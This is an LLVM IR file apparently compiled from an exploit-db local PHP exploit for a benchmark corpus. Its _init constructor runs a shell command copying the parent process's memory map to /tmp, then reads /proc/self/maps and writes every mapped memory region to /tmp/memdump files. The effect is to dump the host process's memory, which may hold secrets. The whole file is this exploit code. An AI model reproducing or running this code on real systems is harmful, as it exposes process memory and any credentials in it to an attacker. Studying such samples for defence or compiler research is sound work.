; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/php/local/extr_23023.c__init.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/php/local/extr_23023.c__init.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [21 x i8] c"Starting up: pid %d\0A\00", align 1
@.str.1 = private unnamed_addr constant [30 x i8] c"cat /proc/$PPID/maps > /tmp/t\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"/proc/self/maps\00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"read: \00", align 1
@.str.5 = private unnamed_addr constant [12 x i8] c"%08x-%08x \0A\00", align 1
@.str.6 = private unnamed_addr constant [22 x i8] c"\0AStart: %p, Stop: %p\0A\00", align 1
@.str.7 = private unnamed_addr constant [16 x i8] c"/tmp/memdump.%p\00", align 1
@.str.8 = private unnamed_addr constant [16 x i8] c"saving data to \00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@O_WRONLY = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@O_TRUNC = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [22 x i8] c"Unable to open file.\0A\00", align 1
@.str.11 = private unnamed_addr constant [25 x i8] c"\0A--> should be done now\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @_init() #0 {
  %1 = alloca [1024 x i8], align 16
  %2 = alloca [1024 x i8], align 16
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32*, align 8
  %7 = getelementptr inbounds [1024 x i8], [1024 x i8]* %1, i64 0, i64 0
  %8 = call i32 (...) @getpid()
  %9 = call i32 (i8*, i8*, i32, ...) @sprintf(i8* %7, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i64 0, i64 0), i32 %8)
  %10 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.1, i64 0, i64 0))
  %11 = getelementptr inbounds [1024 x i8], [1024 x i8]* %1, i64 0, i64 0
  %12 = call i32 @trace(i8* %11)
  %13 = call i32* @fopen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  store i32* %13, i32** %6, align 8
  br label %14

14:                                               ; preds = %57, %0
  %15 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 0
  %16 = load i32*, i32** %6, align 8
  %17 = call i64 @fgets(i8* %15, i32 1023, i32* %16)
  %18 = icmp ne i64 %17, 0
  br i1 %18, label %19, label %58

19:                                               ; preds = %14
  %20 = call i32 @trace(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %21 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 0
  %22 = call i32 @trace(i8* %21)
  %23 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 0
  %24 = call i32 @sscanf(i8* %23, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.5, i64 0, i64 0), i32* %4, i32* %5)
  %25 = getelementptr inbounds [1024 x i8], [1024 x i8]* %1, i64 0, i64 0
  %26 = load i32, i32* %4, align 4
  %27 = load i32, i32* %5, align 4
  %28 = call i32 (i8*, i8*, i32, ...) @sprintf(i8* %25, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.6, i64 0, i64 0), i32 %26, i32 %27)
  %29 = getelementptr inbounds [1024 x i8], [1024 x i8]* %1, i64 0, i64 0
  %30 = call i32 @trace(i8* %29)
  %31 = getelementptr inbounds [1024 x i8], [1024 x i8]* %1, i64 0, i64 0
  %32 = load i32, i32* %4, align 4
  %33 = call i32 (i8*, i8*, i32, ...) @sprintf(i8* %31, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i64 0, i64 0), i32 %32)
  %34 = call i32 @trace(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.8, i64 0, i64 0))
  %35 = getelementptr inbounds [1024 x i8], [1024 x i8]* %1, i64 0, i64 0
  %36 = call i32 @trace(i8* %35)
  %37 = call i32 @trace(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0))
  %38 = getelementptr inbounds [1024 x i8], [1024 x i8]* %1, i64 0, i64 0
  %39 = load i32, i32* @O_WRONLY, align 4
  %40 = load i32, i32* @O_CREAT, align 4
  %41 = or i32 %39, %40
  %42 = load i32, i32* @O_TRUNC, align 4
  %43 = or i32 %41, %42
  %44 = call i32 @open(i8* %38, i32 %43, i32 511)
  store i32 %44, i32* %3, align 4
  %45 = icmp slt i32 %44, 0
  br i1 %45, label %46, label %48

46:                                               ; preds = %19
  %47 = call i32 @trace(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.10, i64 0, i64 0))
  br label %57

48:                                               ; preds = %19
  %49 = load i32, i32* %3, align 4
  %50 = load i32, i32* %4, align 4
  %51 = load i32, i32* %5, align 4
  %52 = load i32, i32* %4, align 4
  %53 = sub i32 %51, %52
  %54 = call i32 @write(i32 %49, i32 %50, i32 %53)
  %55 = load i32, i32* %3, align 4
  %56 = call i32 @close(i32 %55)
  br label %57

57:                                               ; preds = %48, %46
  br label %14

58:                                               ; preds = %14
  %59 = load i32*, i32** %6, align 8
  %60 = call i32 @fclose(i32* %59)
  %61 = call i32 @trace(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.11, i64 0, i64 0))
  ret void
}

declare dso_local i32 @sprintf(i8*, i8*, i32, ...) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @trace(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i64 @fgets(i8*, i32, i32*) #1

declare dso_local i32 @sscanf(i8*, i8*, i32*, i32*) #1

declare dso_local i32 @open(i8*, i32, i32) #1

declare dso_local i32 @write(i32, i32, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
